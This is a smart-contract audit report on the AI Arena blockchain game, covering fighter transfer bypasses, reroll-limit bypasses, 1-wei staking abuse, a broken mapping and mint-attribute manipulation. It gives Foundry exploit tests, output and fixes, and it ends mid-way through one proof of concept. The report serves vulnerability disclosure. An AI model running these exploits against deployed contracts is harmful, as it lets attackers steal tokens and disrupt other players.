| Severity | Title | 
|:--:|:---|
| [H-01](#h-01-a-locked-fighter-can-be-transferred-leads-to-game-server-unable-to-commit-transactions-and-unstoppable-fighters) | A locked fighter can be transferred; leads to game server unable to commit transactions, and unstoppable fighters |
| [H-02](#h-02-since-you-can-reroll-with-a-different-fightertype-than-the-nft-you-own-you-can-reroll-bypassing-maxrerollsallowed-and-reroll-attributes-based-on-a-different-fightertype) | Since you can reroll with a different fighterType than the NFT you own, you can reroll bypassing maxRerollsAllowed and reroll attributes based on a different fighterType |
| [H-03](#h-03-malicious-user-can-stake-an-amount-which-causes-zero-curstakeatrisk-on-a-loss-but-equal-rewardpoints-to-a-fair-user-on-a-win) | Malicious user can stake an amount which causes zero curStakeAtRisk on a loss but equal rewardPoints to a fair user on a win |
| [H-04](#h-04-fighters-cannot-be-minted-after-the-initial-generation-due-to-uninitialized-numelements-mapping) | Fighters cannot be minted after the initial generation due to uninitialized numElements mapping |
| [M-01](#m-01-can-mint-nft-with-the-desired-attributes-by-reverting-transaction) | Can mint NFT with the desired attributes by reverting transaction |
| [M-02](#m-02-nfts-can-be-transferred-even-if-stakeatrisk-remains-so-the-users-win-cannot-be-recorded-on-the-chain-due-to-underflow-and-can-recover-past-losses-that-cant-be-recoveredsteal-protocols-token) | NFTs can be transferred even if StakeAtRisk remains, so the user's win cannot be recorded on the chain due to underflow, and can recover past losses that can't be recovered(steal protocol's token) |
| [M-03](#m-03-erroneous-probability-calculation-in-physical-attributes-can-lead-to-significant-issues) | Erroneous probability calculation in physical attributes can lead to significant issues |

# [H-01] A locked fighter can be transferred; leads to game server unable to commit transactions, and unstoppable fighters
## Impact
FighterFarm contract implements restrictions on transferability of fighters in functions transferFrom() and safeTransferFrom(), via the call to function _ableToTransfer(). Unfortunately this approach doesn't cover all possible ways to transfer a fighter: The FighterFarm contract inherits from OpenZeppelin's ERC721 contract, which includes the public function safeTransferFrom(..., data), i.e. the same as safeTransferFrom() but with the additional data parameter. This inherited function becomes available in the GameItems contract, and calling it allows to circumvent the transferability restriction. As a result, a player will be able to transfer any of their fighters, irrespective of whether they are locked or not. Violation of such a basic system invariant leads to various kinds of impacts, including:

The game server won't be able to commit some transactions;
The transferred fighter becomes unstoppable (a transaction in which it loses can't be committed);
The transferred fighter may be used as a "poison pill" to spoil another player, and prevent it from leaving the losing zone (a transaction in which it wins can't be committed).
Both of the last two impacts include the inability of the game server to commit certain transactions, so we illustrate both of the last two with PoCs, thus illustrating the first one as well.

Impact 1: a fighter becomes unstoppable, game server unable to commit
If a fighter wins a battle, points are added to accumulatedPointsPerAddress mapping. When a fighter loses a battle, the reverse happens: points are subtracted. If a fighter is transferred after it wins the battle to another address, accumulatedPointsPerAddress for the new address is empty, and thus the points can't be subtracted: the game server transaction will be reverted. By transferring the fighter to a new address after each battle, the fighter becomes unstoppable, as its accumulated points will only grow, and will never decrease.

Impact 2: another fighter can't win, game server unable to commit
If a fighter loses a battle, funds are transferred from the amount at stake, to the stake-at risk, which is reflected in the amountLost mapping of StakeAtRisk contract. If the fighter with stake-at-risk is transferred to another player, the invariant that amountLost reflects the lost amount per address is violated: after the transfer the second player has more stake-at-risk than before. A particular way to exploit this violation is demonstrated below: the transferred fighter may win a battle, which leads to reducing amountLost by the corresponding amount. Upon subsequent wins of the second player own fighters, this operation will underflow, leading to the game server unable to commit transactions, and the player unable to exit the losing zone. This effectively makes a fighter with the stake-at-risk a "poison pill".

## Proof of Concept
Impact 1: a fighter becomes unstoppable, game server unable to commit
```diff
diff --git a/test/RankedBattle.t.sol b/test/RankedBattle.t.sol
index 6c5a1d7..dfaaad4 100644
--- a/test/RankedBattle.t.sol
+++ b/test/RankedBattle.t.sol
@@ -465,6 +465,31 @@ contract RankedBattleTest is Test {
         assertEq(unclaimedNRN, 5000 * 10 ** 18);
     }
 
+   /// @notice An exploit demonstrating that it's possible to transfer a staked fighter, and make it immortal!
+    function testExploitTransferStakedFighterAndPlay() public {
+        address player = vm.addr(3);
+        address otherPlayer = vm.addr(4);
+        _mintFromMergingPool(player);
+        uint8 tokenId = 0;
+        _fundUserWith4kNeuronByTreasury(player);
+        vm.prank(player);
+        _rankedBattleContract.stakeNRN(1 * 10 ** 18, tokenId);
+        // The fighter wins one battle
+        vm.prank(address(_GAME_SERVER_ADDRESS));
+        _rankedBattleContract.updateBattleRecord(tokenId, 0, 0, 1500, true);
+        // The player transfers the fighter to other player
+        vm.prank(address(player));
+        _fighterFarmContract.safeTransferFrom(player, otherPlayer, tokenId, "");
+        assertEq(_fighterFarmContract.ownerOf(tokenId), otherPlayer);
+        // The fighter can't lose
+        vm.prank(address(_GAME_SERVER_ADDRESS));
+        vm.expectRevert();
+        _rankedBattleContract.updateBattleRecord(tokenId, 0, 2, 1500, true);
+        // The fighter can only win: it's unstoppable!
+        vm.prank(address(_GAME_SERVER_ADDRESS));
+        _rankedBattleContract.updateBattleRecord(tokenId, 0, 0, 1500, true);
+    }
+
     /*//////////////////////////////////////////////////////////////
                                HELPERS
     //////////////////////////////////////////////////////////////*/
```
Place the PoC into test/RankedBattle.t.sol, and execute with
```shell
forge test --match-test testExploitTransferStakedFighterAndPlay
```
Impact 2: another fighter can't win, game server unable to commit
```diff
diff --git a/test/RankedBattle.t.sol b/test/RankedBattle.t.sol
index 6c5a1d7..196e3a0 100644
--- a/test/RankedBattle.t.sol
+++ b/test/RankedBattle.t.sol
@@ -465,6 +465,62 @@ contract RankedBattleTest is Test {
         assertEq(unclaimedNRN, 5000 * 10 ** 18);
     }
 
+/// @notice Prepare two players and two fighters
+function preparePlayersAndFighters() public returns (address, address, uint8, uint8) {
+    address player1 = vm.addr(3);
+    _mintFromMergingPool(player1);
+    uint8 fighter1 = 0;
+    _fundUserWith4kNeuronByTreasury(player1);
+    address player2 = vm.addr(4);
+    _mintFromMergingPool(player2);
+    uint8 fighter2 = 1;
+    _fundUserWith4kNeuronByTreasury(player2);
+    return (player1, player2, fighter1, fighter2);
+}
+
+/// @notice An exploit demonstrating that it's possible to transfer a fighter with funds at stake
+/// @notice After transferring the fighter, it wins the battle, 
+/// @notice and the second player can't exit from the stake-at-risk zone anymore.
+function testExploitTransferStakeAtRiskFighterAndSpoilOtherPlayer() public {
+    (address player1, address player2, uint8 fighter1, uint8 fighter2) = 
+        preparePlayersAndFighters();
+    vm.prank(player1);
+    _rankedBattleContract.stakeNRN(1_000 * 10 **18, fighter1);        
+    vm.prank(player2);
+    _rankedBattleContract.stakeNRN(1_000 * 10 **18, fighter2);        
+    // Fighter1 loses a battle
+    vm.prank(address(_GAME_SERVER_ADDRESS));
+    _rankedBattleContract.updateBattleRecord(fighter1, 0, 2, 1500, true);
+    assertEq(_rankedBattleContract.amountStaked(fighter1), 999 * 10 ** 18);
+    // Fighter2 loses a battle
+    vm.prank(address(_GAME_SERVER_ADDRESS));
+    _rankedBattleContract.updateBattleRecord(fighter2, 0, 2, 1500, true);
+    assertEq(_rankedBattleContract.amountStaked(fighter2), 999 * 10 ** 18);
+
+    // On the game server, player1 initiates a battle with fighter1,
+    // then unstakes all remaining stake from fighter1, and transfers it
+    vm.prank(address(player1));
+    _rankedBattleContract.unstakeNRN(999 * 10 ** 18, fighter1);
+    vm.prank(address(player1));
+    _fighterFarmContract.safeTransferFrom(player1, player2, fighter1, "");
+    assertEq(_fighterFarmContract.ownerOf(fighter1), player2);
+    // Fighter1 wins a battle, and part of its stake-at-risk is derisked.
+    vm.prank(address(_GAME_SERVER_ADDRESS));
+    _rankedBattleContract.updateBattleRecord(fighter1, 0, 0, 1500, true);
+    assertEq(_rankedBattleContract.amountStaked(fighter1), 1 * 10 ** 15);
+    // Fighter2 wins a battle, but the records can't be updated, due to underflow!
+    vm.expectRevert();
+    vm.prank(address(_GAME_SERVER_ADDRESS));
+    _rankedBattleContract.updateBattleRecord(fighter2, 0, 0, 1500, true);
+    // Fighter2 can't ever exit from the losing zone in this round, but can lose battles
+    vm.prank(address(_GAME_SERVER_ADDRESS));
+    _rankedBattleContract.updateBattleRecord(fighter2, 0, 2, 1500, true);
+    (uint32 wins, uint32 ties, uint32 losses) = _rankedBattleContract.getBattleRecord(fighter2);
+    assertEq(wins, 0);
+    assertEq(ties, 0);
+    assertEq(losses, 2);
+}
+
     /*//////////////////////////////////////////////////////////////
                                HELPERS
     //////////////////////////////////////////////////////////////*/
```
Place the PoC into test/RankedBattle.t.sol, and execute with
```shell
forge test --match-test testExploitTransferStakeAtRiskFighterAndSpoilOtherPlayer
```

## Lines of code
https://github.com/code-423n4/2024-02-ai-arena/blob/70b73ce5acaf10bc331cf388d35e4edff88d4541/src/FighterFarm.sol#L338-L348
https://github.com/code-423n4/2024-02-ai-arena/blob/70b73ce5acaf10bc331cf388d35e4edff88d4541/src/FighterFarm.sol#L355-L365
https://github.com/code-423n4/2024-02-ai-arena/blob/f2952187a8afc44ee6adc28769657717b498b7d4/src/RankedBattle.sol#L486
https://github.com/code-423n4/2024-02-ai-arena/blob/70b73ce5acaf10bc331cf388d35e4edff88d4541/src/StakeAtRisk.sol#L104

## Tool used
Manual Review

## Recommended Mitigation Steps
We recommend to remove the incomplete checks in the inherited functions transferFrom() and safeTransferFrom() of FighterFarm contract, and instead to enforce the transferability restriction via the _beforeTokenTransfer() hook, which applies equally to all token transfers, as illustrated below.
```diff
diff --git a/src/FighterFarm.sol b/src/FighterFarm.sol
index 06ee3e6..9f9ac54 100644
--- a/src/FighterFarm.sol
+++ b/src/FighterFarm.sol
@@ -330,40 +330,6 @@ contract FighterFarm is ERC721, ERC721Enumerable {
         );
     }
 
-    /// @notice Transfer NFT ownership from one address to another.
-    /// @dev Add a custom check for an ability to transfer the fighter.
-    /// @param from Address of the current owner.
-    /// @param to Address of the new owner.
-    /// @param tokenId ID of the fighter being transferred.
-    function transferFrom(
-        address from, 
-        address to, 
-        uint256 tokenId
-    ) 
-        public 
-        override(ERC721, IERC721)
-    {
-        require(_ableToTransfer(tokenId, to));
-        _transfer(from, to, tokenId);
-    }
-
-    /// @notice Safely transfers an NFT from one address to another.
-    /// @dev Add a custom check for an ability to transfer the fighter.
-    /// @param from Address of the current owner.
-    /// @param to Address of the new owner.
-    /// @param tokenId ID of the fighter being transferred.
-    function safeTransferFrom(
-        address from, 
-        address to, 
-        uint256 tokenId
-    ) 
-        public 
-        override(ERC721, IERC721)
-    {
-        require(_ableToTransfer(tokenId, to));
-        _safeTransfer(from, to, tokenId, "");
-    }
-
     /// @notice Rolls a new fighter with random traits.
     /// @param tokenId ID of the fighter being re-rolled.
     /// @param fighterType The fighter type.
@@ -448,7 +414,9 @@ contract FighterFarm is ERC721, ERC721Enumerable {
         internal
         override(ERC721, ERC721Enumerable)
     {
-        super._beforeTokenTransfer(from, to, tokenId);
+        if(from != address(0) && to != address(0))
+            require(_ableToTransfer(tokenId, to));
+        super._beforeTokenTransfer(from, to , tokenId);
     }
 
     /*//////////////////////////////////////////////////////////////
```

# [H-02] Since you can reroll with a different fighterType than the NFT you own, you can reroll bypassing maxRerollsAllowed and reroll attributes based on a different fighterType
## Impact
Can reroll attributes based on a different fighterType, and can bypass maxRerollsAllowed.

## Proof of Concept
maxRerollsAllowed can be set differently depending on the fighterType. Precisely, it increases as the generation of fighterType increases.
```solidity
function incrementGeneration(uint8 fighterType) external returns (uint8) {
    require(msg.sender == _ownerAddress);
@>  generation[fighterType] += 1;
@>  maxRerollsAllowed[fighterType] += 1;
    return generation[fighterType];
}
```
The reRoll function does not verify if the fighterType given as a parameter is actually the fighterType of the given tokenId. Therefore, it can use either 0 or 1 regardless of the actual type of the NFT.

This allows bypassing maxRerollsAllowed for additional reRoll, and to call _createFighterBase and createPhysicalAttributes based on a different fighterType than the actual NFT's fighterType, resulting in attributes calculated based on different criteria.
```solidity
function reRoll(uint8 tokenId, uint8 fighterType) public {
    require(msg.sender == ownerOf(tokenId));
@>  require(numRerolls[tokenId] < maxRerollsAllowed[fighterType]);
    require(_neuronInstance.balanceOf(msg.sender) >= rerollCost, "Not enough NRN for reroll");

    _neuronInstance.approveSpender(msg.sender, rerollCost);
    bool success = _neuronInstance.transferFrom(msg.sender, treasuryAddress, rerollCost);
    if (success) {
        numRerolls[tokenId] += 1;
        uint256 dna = uint256(keccak256(abi.encode(msg.sender, tokenId, numRerolls[tokenId])));
@>      (uint256 element, uint256 weight, uint256 newDna) = _createFighterBase(dna, fighterType);
        fighters[tokenId].element = element;
        fighters[tokenId].weight = weight;
        fighters[tokenId].physicalAttributes = _aiArenaHelperInstance.createPhysicalAttributes(
            newDna,
@>          generation[fighterType],
            fighters[tokenId].iconsType,
            fighters[tokenId].dendroidBool
        );
        _tokenURIs[tokenId] = "";
    }
}
```
This is PoC.

First, there is a bug that there is no way to set numElements, so add a numElements setter to FighterFarm. This bug has been submitted as a separate report.
```solidity
function numElementsSetterForPoC(uint8 _generation, uint8 _newElementNum) public {
    require(msg.sender == _ownerAddress);
    require(_newElementNum > 0);
    numElements[_generation] = _newElementNum;
}
```
Add a test to the FighterFarm.t.sol file and run it. The generation of Dendroid has increased, and maxRerollsAllowed has increased. The user who owns the Champion NFT bypassed maxRerollsAllowed by putting the fighterType of Dendroid as a parameter in the reRoll function.
```solidity
function testPoCRerollBypassMaxRerollsAllowed() public {
    _mintFromMergingPool(_ownerAddress);
    // get 4k neuron from treasury
    _fundUserWith4kNeuronByTreasury(_ownerAddress);
    // after successfully minting a fighter, update the model
    if (_fighterFarmContract.ownerOf(0) == _ownerAddress) {
        uint8 maxRerolls = _fighterFarmContract.maxRerollsAllowed(0);
        uint8 exceededLimit = maxRerolls + 1;
        uint8 tokenId = 0;
        uint8 fighterType = 0;

        // The Dendroid's generation changed, and maxRerollsAllowed for Dendroid is increased
        uint8 fighterType_Dendroid = 1;

        _fighterFarmContract.incrementGeneration(fighterType_Dendroid);

        assertEq(_fighterFarmContract.maxRerollsAllowed(fighterType_Dendroid), maxRerolls + 1);
        assertEq(_fighterFarmContract.maxRerollsAllowed(fighterType), maxRerolls); // Champions maxRerollsAllowed is not changed

        _neuronContract.addSpender(address(_fighterFarmContract));

        _fighterFarmContract.numElementsSetterForPoC(1, 3); // this is added function for poc

        for (uint8 i = 0; i < exceededLimit; i++) {
            if (i == (maxRerolls)) {
                // reRoll with different fighterType
                assertEq(_fighterFarmContract.numRerolls(tokenId), maxRerolls);
                _fighterFarmContract.reRoll(tokenId, fighterType_Dendroid);
                assertEq(_fighterFarmContract.numRerolls(tokenId), exceededLimit);
            } else {
                _fighterFarmContract.reRoll(tokenId, fighterType);
            }
        }
    }
}
```

## Lines of code
https://github.com/code-423n4/2024-02-ai-arena/blob/1d18d1298729e443e14fea08149c77182a65da32/src/FighterFarm.sol#L372

## Tool used
Manual Review

## Recommended Mitigation Steps
Check fighterType at reRoll function.
```solidity
function reRoll(uint8 tokenId, uint8 fighterType) public {
    require(msg.sender == ownerOf(tokenId));
    require(numRerolls[tokenId] < maxRerollsAllowed[fighterType]);
    require(_neuronInstance.balanceOf(msg.sender) >= rerollCost, "Not enough NRN for reroll");
+   require((fighterType == 1 && fighters[tokenId].dendroidBool) || (fighterType == 0 && !fighters[tokenId].dendroidBool), "Wrong fighterType");

    _neuronInstance.approveSpender(msg.sender, rerollCost);
    bool success = _neuronInstance.transferFrom(msg.sender, treasuryAddress, rerollCost);
    if (success) {
        numRerolls[tokenId] += 1;
        uint256 dna = uint256(keccak256(abi.encode(msg.sender, tokenId, numRerolls[tokenId])));
        (uint256 element, uint256 weight, uint256 newDna) = _createFighterBase(dna, fighterType);
        fighters[tokenId].element = element;
        fighters[tokenId].weight = weight;
        fighters[tokenId].physicalAttributes = _aiArenaHelperInstance.createPhysicalAttributes(
            newDna,
            generation[fighterType],
            fighters[tokenId].iconsType,
            fighters[tokenId].dendroidBool
        );
        _tokenURIs[tokenId] = "";
    }
}
```

# [H-03] Malicious user can stake an amount which causes zero curStakeAtRisk on a loss but equal rewardPoints to a fair user on a win
## Impact
The _getStakingFactor() function rounds-up the stakingFactor_ to one if its zero. Additionally, the _addResultPoints() function rounds-down the curStakeAtRisk.

Whenever a player loses and has no accumulated reward points, 0.1% of his staked amount is considered "at risk" and transferred to the _stakeAtRiskAddress. However due to the above calculation styles, he can stake just 1 wei of NRN to have zero curStakeAtRisk in case of a loss and in case of a win, still gain the same amount of reward points as a player staking 4e18-1 wei of NRN.


Let's look at three cases of a player with ELO as 1500:

Case	Staked NRN	stakingFactor calculated by the protocol	Reward Points accumulated in case of a WIN	NRNs lost (stake at risk) in case of a LOSS
1	4	2	1500	0.004
2	3.999999999999999999	1	750	0.003999999999999999
3	0.000000000000000001	1	750	0
As can be seen in Case2 vs Case3, a player staking 0.000000000000000001 NRN (1 wei) has the same upside in case of a win as a player staking 3.999999999999999999 NRN (4e18-1 wei) while their downside is 0.

## Proof of Concept
Add the following test inside test/RankedBattle.t.sol and run via forge test -vv --mt test_t0x1c_UpdateBattleRecord_SmallStake to see the ouput under the 3 different cases:
```solidity
    function test_t0x1c_UpdateBattleRecord_SmallStake() public {
        address player = vm.addr(3);
        _mintFromMergingPool(player);
        uint8 tokenId = 0;
        _fundUserWith4kNeuronByTreasury(player);
        
        // snapshot the current state
        uint256 snapshot0 = vm.snapshot();

        vm.prank(player);
        _rankedBattleContract.stakeNRN(4e18, 0);

        console.log("\n\n==================================== CASE 1 ==========================================================");
        emit log_named_decimal_uint("Stats when staked amount =", 4e18, 18);

        // snapshot the current state
        uint256 snapshot0_1 = vm.snapshot();

        vm.prank(address(_GAME_SERVER_ADDRESS));
        _rankedBattleContract.updateBattleRecord(0, 50, 0, 1500, true); // if player had won
        (uint256 wins,,) = _rankedBattleContract.fighterBattleRecord(tokenId);
        assertEq(wins, 1);
        

        console.log("\n----------------------------------  IF WON  ---------------------------------------------------");
        console.log("accumulatedPointsPerFighter =:", _rankedBattleContract.accumulatedPointsPerFighter(0, 0));
        emit log_named_decimal_uint("getStakeAtRisk =", _stakeAtRiskContract.getStakeAtRisk(tokenId), 18);
        emit log_named_decimal_uint("_rankedBattleContract NRN balance =", _neuronContract.balanceOf(address(_rankedBattleContract)), 18);
        emit log_named_decimal_uint("_stakeAtRiskContract NRN balance =", _neuronContract.balanceOf(address(_stakeAtRiskContract)), 18);

        // Restore to snapshot state
        vm.revertTo(snapshot0_1);

        vm.prank(address(_GAME_SERVER_ADDRESS));
        _rankedBattleContract.updateBattleRecord(0, 50, 2, 1500, true); // if player had lost
        (,, uint256 losses) = _rankedBattleContract.fighterBattleRecord(tokenId);
        assertEq(losses, 1);

        console.log("\n----------------------------------  IF LOST  ---------------------------------------------------");
        console.log("accumulatedPointsPerFighter =", _rankedBattleContract.accumulatedPointsPerFighter(0, 0));
        emit log_named_decimal_uint("getStakeAtRisk =", _stakeAtRiskContract.getStakeAtRisk(tokenId), 18);
        emit log_named_decimal_uint("_rankedBattleContract NRN balance =", _neuronContract.balanceOf(address(_rankedBattleContract)), 18);
        emit log_named_decimal_uint("_stakeAtRiskContract NRN balance =", _neuronContract.balanceOf(address(_stakeAtRiskContract)), 18);


        // Restore to snapshot state
        vm.revertTo(snapshot0);

        vm.prank(player);
        _rankedBattleContract.stakeNRN(4e18-1, 0);

        console.log("\n\n==================================== CASE 2 ==========================================================");
        emit log_named_decimal_uint("Stats when staked amount =", 4e18-1, 18);

        // snapshot the current state
        uint256 snapshot1_1 = vm.snapshot();

        vm.prank(address(_GAME_SERVER_ADDRESS));
        _rankedBattleContract.updateBattleRecord(0, 50, 0, 1500, true); // if player had won
        (wins,,) = _rankedBattleContract.fighterBattleRecord(tokenId);
        assertEq(wins, 1);
        

        console.log("\n----------------------------------  IF WON  ---------------------------------------------------");
        console.log("accumulatedPointsPerFighter =:", _rankedBattleContract.accumulatedPointsPerFighter(0, 0));
        emit log_named_decimal_uint("getStakeAtRisk =", _stakeAtRiskContract.getStakeAtRisk(tokenId), 18);
        emit log_named_decimal_uint("_rankedBattleContract NRN balance =", _neuronContract.balanceOf(address(_rankedBattleContract)), 18);
        emit log_named_decimal_uint("_stakeAtRiskContract NRN balance =", _neuronContract.balanceOf(address(_stakeAtRiskContract)), 18);

        // Restore to snapshot state
        vm.revertTo(snapshot1_1);

        vm.prank(address(_GAME_SERVER_ADDRESS));
        _rankedBattleContract.updateBattleRecord(0, 50, 2, 1500, true); // if player had lost
        (,, losses) = _rankedBattleContract.fighterBattleRecord(tokenId);
        assertEq(losses, 1);

        console.log("\n----------------------------------  IF LOST  ---------------------------------------------------");
        console.log("accumulatedPointsPerFighter =", _rankedBattleContract.accumulatedPointsPerFighter(0, 0));
        emit log_named_decimal_uint("getStakeAtRisk =", _stakeAtRiskContract.getStakeAtRisk(tokenId), 18);
        emit log_named_decimal_uint("_rankedBattleContract NRN balance =", _neuronContract.balanceOf(address(_rankedBattleContract)), 18);
        emit log_named_decimal_uint("_stakeAtRiskContract NRN balance =", _neuronContract.balanceOf(address(_stakeAtRiskContract)), 18);


        // Restore to snapshot state
        vm.revertTo(snapshot0);

        vm.prank(player);
        _rankedBattleContract.stakeNRN(1, 0);

        console.log("\n\n==================================== CASE 3 ==========================================================");
        emit log_named_decimal_uint("Stats when staked amount =", 1, 18);

        // snapshot the current state
        uint256 snapshot2_1 = vm.snapshot();

        vm.prank(address(_GAME_SERVER_ADDRESS));
        _rankedBattleContract.updateBattleRecord(0, 50, 0, 1500, true); // if player had won
        (wins,,) = _rankedBattleContract.fighterBattleRecord(tokenId);
        assertEq(wins, 1);
        

        console.log("\n----------------------------------  IF WON  ---------------------------------------------------");
        console.log("accumulatedPointsPerFighter =:", _rankedBattleContract.accumulatedPointsPerFighter(0, 0));
        emit log_named_decimal_uint("getStakeAtRisk =", _stakeAtRiskContract.getStakeAtRisk(tokenId), 18);
        emit log_named_decimal_uint("_rankedBattleContract NRN balance =", _neuronContract.balanceOf(address(_rankedBattleContract)), 18);
        emit log_named_decimal_uint("_stakeAtRiskContract NRN balance =", _neuronContract.balanceOf(address(_stakeAtRiskContract)), 18);

        // Restore to snapshot state
        vm.revertTo(snapshot2_1);

        vm.prank(address(_GAME_SERVER_ADDRESS));
        _rankedBattleContract.updateBattleRecord(0, 50, 2, 1500, true); // if player had lost
        (,, losses) = _rankedBattleContract.fighterBattleRecord(tokenId);
        assertEq(losses, 1);

        console.log("\n----------------------------------  IF LOST  ---------------------------------------------------");
        console.log("accumulatedPointsPerFighter =", _rankedBattleContract.accumulatedPointsPerFighter(0, 0));
        emit log_named_decimal_uint("getStakeAtRisk =", _stakeAtRiskContract.getStakeAtRisk(tokenId), 18);
        emit log_named_decimal_uint("_rankedBattleContract NRN balance =", _neuronContract.balanceOf(address(_rankedBattleContract)), 18);
        emit log_named_decimal_uint("_stakeAtRiskContract NRN balance =", _neuronContract.balanceOf(address(_stakeAtRiskContract)), 18);
    }
```
Output:
```shell
==================================== CASE 1 ==========================================================
  Stats when staked amount =: 4.000000000000000000

----------------------------------  IF WON  ---------------------------------------------------
  accumulatedPointsPerFighter =: 1500
  getStakeAtRisk =: 0.000000000000000000
  _rankedBattleContract NRN balance =: 4.000000000000000000
  _stakeAtRiskContract NRN balance =: 0.000000000000000000

----------------------------------  IF LOST  ---------------------------------------------------
  accumulatedPointsPerFighter = 0
  getStakeAtRisk =: 0.004000000000000000
  _rankedBattleContract NRN balance =: 3.996000000000000000
  _stakeAtRiskContract NRN balance =: 0.004000000000000000


==================================== CASE 2 ==========================================================
  Stats when staked amount =: 3.999999999999999999

----------------------------------  IF WON  ---------------------------------------------------
  accumulatedPointsPerFighter =: 750
  getStakeAtRisk =: 0.000000000000000000
  _rankedBattleContract NRN balance =: 3.999999999999999999
  _stakeAtRiskContract NRN balance =: 0.000000000000000000

----------------------------------  IF LOST  ---------------------------------------------------
  accumulatedPointsPerFighter = 0
  getStakeAtRisk =: 0.003999999999999999
  _rankedBattleContract NRN balance =: 3.996000000000000000
  _stakeAtRiskContract NRN balance =: 0.003999999999999999


==================================== CASE 3 ==========================================================
  Stats when staked amount =: 0.000000000000000001

----------------------------------  IF WON  ---------------------------------------------------
  accumulatedPointsPerFighter =: 750
  getStakeAtRisk =: 0.000000000000000000
  _rankedBattleContract NRN balance =: 0.000000000000000001
  _stakeAtRiskContract NRN balance =: 0.000000000000000000

----------------------------------  IF LOST  ---------------------------------------------------
  accumulatedPointsPerFighter = 0
  getStakeAtRisk =: 0.000000000000000000
  _rankedBattleContract NRN balance =: 0.000000000000000001
  _stakeAtRiskContract NRN balance =: 0.000000000000000000
```

## Lines of code
https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/RankedBattle.sol#L530-L532
https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/RankedBattle.sol#L439

## Tool used
Manual Review

## Recommended Mitigation Steps
Protocol can choose to set a minimum stake amount of 4 NRN (4e18 wei). One needs to take care that even after a partial unstake, this amount is not allowed to go below 4 NRN.

Also, do not round up stakingFactor_ i.e. remove L530-L532. An additional check can be added too which ensures that stakingFactor_ is greater than zero:
```solidity
  File: src/RankedBattle.sol

  519:              function _getStakingFactor(
  520:                  uint256 tokenId, 
  521:                  uint256 stakeAtRisk
  522:              ) 
  523:                  private 
  524:                  view 
  525:                  returns (uint256) 
  526:              {
  527:                uint256 stakingFactor_ = FixedPointMathLib.sqrt(
  528:                    (amountStaked[tokenId] + stakeAtRisk) / 10**18
  529:                );
- 530:                if (stakingFactor_ == 0) {
- 531:                  stakingFactor_ = 1;
- 532:                }
+ 532:                require(stakingFactor_ > 0, "stakingFactor_ = 0");
  533:                return stakingFactor_;
  534:              }    
```
The above fixes would ensure that curStakeAtRisk can never be gamed to 0 while still having a positive reward potential.

It's may also be a good idea to have a provision to return any "extra" staked amount. For example, if only 4 NRN is required to achieve a stakingFactor of 1 and the player stakes 4.5 NRN, then the extra 0.5 NRN could be returned. This however is up to the protocol to consider.

# [H-04] Fighters cannot be minted after the initial generation due to uninitialized numElements mapping
## Impact
In FighterFarm.sol there is a mapping numElements which stores the number of possible types of elements a fighter can have in a generation:
```solidity
FighterFarm.sol#L84-L85

    /// @notice Mapping of number elements by generation.
    mapping(uint8 => uint8) public numElements;
```
But the problem here is that only the initial generation, Generation 0, is initialized to 3, in the numElements mapping during the constructor of FighterFarm.sol.
```solidity
FighterFarm.sol#L100-L111

    /// @notice Sets the owner address, the delegated address.
    /// @param ownerAddress Address of contract deployer.
    /// @param delegatedAddress Address of delegated signer for messages.
    /// @param treasuryAddress_ Community treasury address.
    constructor(address ownerAddress, address delegatedAddress, address treasuryAddress_)
        ERC721("AI Arena Fighter", "FTR")
    {
        _ownerAddress = ownerAddress;
        _delegatedAddress = delegatedAddress;
        treasuryAddress = treasuryAddress_;
        numElements[0] = 3;
    } 
```
It is therefore not possible to write to the numElements mapping for any other generations. As they are uninitialized, numElements[i] = 0 when i != 0

Moreover, this numElements mapping is read from when creating a fighter
```solidity
FighterFarm.sol#L458-L474

    /// @notice Creates the base attributes for the fighter.
    /// @param dna The dna of the fighter.
    /// @param fighterType The type of the fighter.
    /// @return Attributes of the new fighter: element, weight, and dna.
    function _createFighterBase(
        uint256 dna, 
        uint8 fighterType
    ) 
        private 
        view 
        returns (uint256, uint256, uint256) 
    {
=>      uint256 element = dna % numElements[generation[fighterType]]; // numElements is 0 when generation[fighterType] != 0.
        uint256 weight = dna % 31 + 65;
        uint256 newDna = fighterType == 0 ? dna : uint256(fighterType);
        return (element, weight, newDna);
    }
```
Therefore if the protocol updates to a new generation of fighters, it will not be able to create anymore new fighters as numElements[generation[fighterType]] will be uninitialized and therefore equal 0. This will cause the transaction to always revert as any modulo by 0 will cause a panic according to Solidity Docs

Modulo with zero causes a Panic error. This check can not be disabled through unchecked { ... }.


## Lines of code
https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/FighterFarm.sol#L470

## Tool used
Manual Review

## Recommended Mitigation Steps
Allow the admin to update the numElements mapping when a new generation is created.

# [M-01] Can mint NFT with the desired attributes by reverting transaction
## Impact
Can mint NFT with the desired attribute.

## Proof of Concept
All the attributes of the NFT that should be randomly determined are set in the same transaction which they're claimed. Therefore, if a user uses a contract wallet, they can intentionally revert the transaction and retry minting if they do not get the desired attribute.
```solidity
function _createNewFighter(
    address to, 
    uint256 dna, 
    string memory modelHash,
    string memory modelType, 
    uint8 fighterType,
    uint8 iconsType,
    uint256[2] memory customAttributes
) 
    private 
{  
    require(balanceOf(to) < MAX_FIGHTERS_ALLOWED);
    uint256 element; 
    uint256 weight;
    uint256 newDna;
    if (customAttributes[0] == 100) {
@>      (element, weight, newDna) = _createFighterBase(dna, fighterType);
    }
    else {
        element = customAttributes[0];
        weight = customAttributes[1];
        newDna = dna;
    }
    uint256 newId = fighters.length;

    bool dendroidBool = fighterType == 1;
@>  FighterOps.FighterPhysicalAttributes memory attrs = _aiArenaHelperInstance.createPhysicalAttributes(
        newDna,
        generation[fighterType],
        iconsType,
        dendroidBool
    );
    fighters.push(
        FighterOps.Fighter(
            weight,
            element,
            attrs,
            newId,
            modelHash,
            modelType,
            generation[fighterType],
            iconsType,
            dendroidBool
        )
    );
@>  _safeMint(to, newId);
    FighterOps.fighterCreatedEmitter(newId, weight, element, generation[fighterType]);
}

function _createFighterBase(
    uint256 dna, 
    uint8 fighterType
) 
    private 
    view 
    returns (uint256, uint256, uint256) 
{
    uint256 element = dna % numElements[generation[fighterType]];
    uint256 weight = dna % 31 + 65;
    uint256 newDna = fighterType == 0 ? dna : uint256(fighterType);
    return (element, weight, newDna);
}
```
This is PoC.

First, add the PoCCanClaimSpecificAttributeByRevert contract at the bottom of the FighterFarm.t.sol file. This contract represents a user-customizable contract wallet. If the user does not get an NFT with desired attributes, they can revert the transaction and retry minting again.
```solidity
contract PoCCanClaimSpecificAttributeByRevert {
    FighterFarm fighterFarm;
    address owner;

